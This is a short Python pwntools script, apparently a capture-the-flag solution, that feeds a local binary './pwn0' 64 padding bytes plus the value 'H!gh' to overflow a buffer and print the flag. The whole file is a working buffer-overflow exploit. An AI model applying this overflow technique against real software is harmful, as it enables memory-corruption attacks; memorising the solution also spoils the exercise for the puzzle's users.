from pwn import *

p = process("./pwn0")
p.sendline(b"A" * 64 + b"H!gh")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
